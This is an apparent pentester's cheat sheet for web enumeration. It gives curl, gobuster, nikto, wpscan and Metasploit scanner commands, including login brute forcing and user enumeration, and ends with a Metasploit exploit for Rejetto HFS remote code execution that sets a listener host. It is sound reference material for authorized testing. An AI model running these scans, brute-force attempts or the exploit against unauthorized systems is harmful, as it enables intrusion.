## HTTP Banner

```bash
curl -I http://<T_IP>
```

```bash
curl -I https://<T_IP>
```

## Using whatweb (detailed)

```bash
whatweb http://<T_IP>
```

## Basic directory scan

```bash
gobuster dir -u http://<T_IP> -w /usr/share/wordlists/dirb/common.txt
```

## With file extensions

```bash
gobuster dir -u http://<T_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,zip,sql,swp,txt
```

## Basic web server scan

```bash
nikto -h http://<T_IP>
```

## Scan with specific port

```bash
nikto -h <T_IP> -p 8080
```

## Save output to file

```bash
nikto -h http://<T_IP> -o nikto_results.txt
```

## Check common files

```bash
curl http://<T_IP>/robots.txt
```

```bash
curl http://<T_IP>/sitemap.xml
```

```bash
curl http://<T_IP>/README.txt
```

```bash
curl http://<T_IP>/CHANGELOG.txt
```

## General Enumeration (Themes, Plugins, Users)

```bash
wpscan --url http://<T_IP>/wordpress -e t,p,u
```

## HTTP Version Detection

```text
msf6 > use auxiliary/scanner/http/http_version
```

## Robots.txt Content Scanner

```text
msf6 > use auxiliary/scanner/http/robots_txt
```

## Header Detection

```text
msf6 > use auxiliary/scanner/http/http_header
```

## Directory Brute Force Scanner

```text
msf6 > use auxiliary/scanner/http/brute_dirs
```

## Directory Scanner

```text
msf6 > use auxiliary/scanner/http/dir_scanner
```

## Interesting File Scanner

```text
msf6 > use auxiliary/scanner/http/files_dir
```

## Login brute Utility

```text
msf6 > use auxiliary/scanner/http/http_login
set AUTH_URI /secure/
```

## Apache mod_userdir user enumeration

```text
msf6 > use auxiliary/scanner/http/apache_userdir_enum

set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set VERBOSE false
```

## Rejetto HFS Exploit

```text
use exploit/windows/http/rejetto_hfs_exec

set RPORT 80
set RHOSTS <T_IP>
set LHOST <L_IP>
```
